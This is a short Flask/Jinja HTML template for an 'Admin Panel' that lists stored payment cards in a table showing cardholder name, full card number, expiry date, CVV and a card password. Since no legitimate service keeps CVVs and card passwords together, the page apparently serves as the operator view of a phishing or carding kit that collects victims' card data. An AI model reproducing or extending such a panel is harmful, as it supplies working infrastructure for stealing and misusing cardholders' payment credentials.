<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Panel</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <style>
        body{
<!--        background: url('https://images.hdqwalls.com/download/the-path-of-tomorrow-q8-2560x1600.jpg') no-repeat center center fixed;-->
        color:#fff;
        background-color:#000;
        }
    </style>


</head>
<body>
    <div class="container"  style="color:#fff;" >
        <h2 class="mt-5">Admin Panel</h2>
        <a href="{{ url_for('logout') }}" class="btn btn-danger mb-3">Logout</a>
        <table class="table table-striped" style="color:#fff;">
            <thead>
                <tr style="color:#fff;">
                    <th style="color:#fff;">Card Holder</th>
                    <th style="color:#fff;">Card Number</th>
                    <th style="color:#fff;">Expiry Date</th>
                    <th style="color:#fff;">CVV</th>
                    <th style="color:#fff;">Password</th>
                </tr>
            </thead>
            <tbody style="color:#fff;">
                {% for card in cards %}
                <tr style="color:#fff;">
                    <td style="color:#fff;">{{ card.card_holder }}</td>
                    <td style="color:#fff;">{{ card.card_number }}</td>
                    <td style="color:#fff;">{{ card.expiry_date }}</td>
                    <td style="color:#fff;">{{ card.cvv }}</td>
                    <td style="color:#fff;">{{ card.card_password }}</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
</body>
</html>
